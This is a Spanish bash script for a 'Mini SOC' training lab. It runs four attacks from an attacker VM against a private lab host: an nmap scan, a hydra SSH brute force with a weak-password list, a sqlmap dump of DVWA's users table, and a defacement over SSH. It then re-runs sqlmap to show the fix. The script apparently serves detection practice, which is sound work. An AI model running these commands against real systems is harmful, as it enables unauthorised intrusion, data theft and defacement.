#!/usr/bin/env bash
# Comandos de los 4 ataques controlados - Mini SOC TiendaCR
# Se ejecutan desde la maquina ATACANTE (10.10.10.100) contra el OBJETIVO (10.10.10.10).
# USO ETICO: solo contra maquinas propias del laboratorio.
set -euo pipefail
OBJETIVO=10.10.10.10

echo "== Ataque 1 - Reconocimiento (MITRE T1046) =="
sudo nmap -sS -sV -A "$OBJETIVO"

echo "== Ataque 2 - Fuerza bruta SSH (MITRE T1110) =="
printf '123456\npassword\nadmin\nletmein\nqwerty\nroot\ntoor\n12345678\nubuntu\nchangeme\n' > /tmp/pass.txt
hydra -l steven -P /tmp/pass.txt -t 4 "ssh://$OBJETIVO" || true

echo "== Ataque 3 - Inyeccion SQL (MITRE T1190) =="
# Login en DVWA para obtener la cookie de sesion
CJ=/tmp/dvwa.cookies
TOKEN=$(curl -s -c "$CJ" "http://$OBJETIVO:8080/login.php" | grep -oP "name='user_token' value='\K[0-9a-f]+")
curl -s -b "$CJ" -c "$CJ" --data "username=admin&password=password&user_token=$TOKEN&Login=Login" "http://$OBJETIVO:8080/login.php" -o /dev/null
COOKIE=$(awk '/PHPSESSID/{print $7}' "$CJ")
sqlmap -u "http://$OBJETIVO:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$COOKIE; security=low" --batch --dump -T users -D dvwa

echo "== Ataque 4 - Modificacion de archivos / defacement (MITRE T1565) =="
ssh steven@"$OBJETIVO" 'echo "<!-- defaced by attacker -->" | sudo tee -a /var/www/tiendacr/index.html'

echo "== Remediacion: repetir Ataque 3 con nivel impossible (ya no inyectable) =="
sqlmap -u "http://$OBJETIVO:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$COOKIE; security=impossible" --batch --flush-session
